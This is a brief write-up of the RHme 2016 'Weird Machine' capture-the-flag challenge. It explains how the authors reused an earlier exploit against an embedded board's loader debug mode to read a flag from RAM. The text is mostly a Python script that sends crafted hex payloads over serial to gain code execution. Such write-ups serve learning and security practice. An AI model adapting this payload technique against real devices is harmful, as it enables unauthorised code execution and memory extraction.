# rhme-2016 write-up Weird Machine

<a name="weird"></a>
## Weird Machine (Exploit - 400 pts)
This challenge is the continuation of hide&seek, but harder (normally).<br>
The behavior is exactly like hide&seek, you're beginning with the loader and you
can enter in debug mode by sending a wrong command.<br>
Before looking elsewhere, we tried the last exploit (h&s) and it didn't work..<br>
But it seems that the code execution still worked and the flag is still @ 0x700
in RAM..We must fuzz this !<br>
And .....nyan..... Kaboooom !!<br>
if you replace 0x1000 by 0x710, you got the flag :)

```python
from rhme_serial import *

s = rhme_serial()
s.xfer("ee\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("04600000"+"00"*(0x16a-6)+"1200\n")
s.xfer("e\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("1e1007\n")
s.xfer("e\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("00000c02fb0c03f40704280805720806540d07a10d08c4080901090a44090b810900be090dfb090e2b0a0f6a0a10a90a11020b12ee0d135107141807153607165b0b17a40b18c10019de0b1afb0b1b180c1c500c1d770c1e950c00414243c4c5464748494a4b4c4d52139455569798595a5b5c1f4e4f50511d1e00000007\n")
print s.xfer("d\n")
s.close()
```
